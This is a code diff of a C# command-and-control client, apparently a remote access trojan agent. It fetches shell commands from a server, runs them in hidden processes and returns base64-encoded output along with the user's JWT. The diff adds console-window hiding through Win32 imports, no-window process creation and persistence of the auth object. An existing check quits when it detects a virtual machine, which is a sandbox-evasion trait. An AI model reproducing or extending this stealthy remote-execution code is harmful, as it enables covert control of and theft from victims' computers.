@@ -3,13 +3,13 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using Newtonsoft.Json;
-using PacemakerClient;
 using System.Net.Http;
 using System.Threading;
 using System.Diagnostics;
 using System.Threading.Tasks;
+using System.Runtime.InteropServices;
 using System.Collections.Generic;
-using System.Runtime.Serialization.Formatters.Binary; 
+using System.Runtime.Serialization.Formatters.Binary;
 
 namespace PacemakerClient_cli
 {
@@ -21,11 +21,16 @@ namespace PacemakerClient_cli
 
     internal class Program
     {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
         public static string server_hostname = "http://localhost:3000";
         public static BinaryFormatter MainBinaryFormatter;
         public static AuthCore authObj;
         static Stream file_stream;
-
        
         public async static Task InitialHandshake()
         {
@@ -89,7 +94,7 @@ namespace PacemakerClient_cli
                 if (cmdObj.active && cmdObj.command.Length > 0)
                 {
                     string result = cmdObj.RunCmd();
-                    resultObj.result = result;
+                    resultObj.result = B64.b64Encode(result);
                     resultObj.username = authObj.Username;
                     resultObj.jwt_key = authObj.JwtToken;
                     resultObj.commandId = cmdObj.commandId;
@@ -100,12 +105,19 @@ namespace PacemakerClient_cli
             {
                 bool status = await authObj.refresh();
 
+
                 if(status == false) // false means refresh has expired and needs to reauthenticate...
                 {
                     await KillSwitch();
                 }
                 else
                 {
+                    MainBinaryFormatter = new BinaryFormatter();
+                    Stream stream1;
+                    stream1 = File.Open("authObject.dat", FileMode.Open);       // serializing auth object
+                    MainBinaryFormatter.Serialize(stream1, authObj);
+                    stream1.Close();
+
                     await GetAndRunCmd();
                 }
 
@@ -145,6 +157,7 @@ namespace PacemakerClient_cli
             process.StartInfo.RedirectStandardInput = true;
             process.StartInfo.RedirectStandardOutput = false;
             process.StartInfo.UseShellExecute = false;
+            process.StartInfo.CreateNoWindow = true;
             process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             
 
@@ -209,7 +222,16 @@ namespace PacemakerClient_cli
 
         static async Task Main(string[] args)
         {
-            
+
+            const int SW_HIDE = 0;
+            const int SW_SHOW = 5;
+            var handle = GetConsoleWindow();
+
+            // Hide
+            // ShowWindow(handle, SW_HIDE);
+
+           
+
             if (Scanner.IsRunningInVM() == true)
             {
                 Console.WriteLine("Nope!");
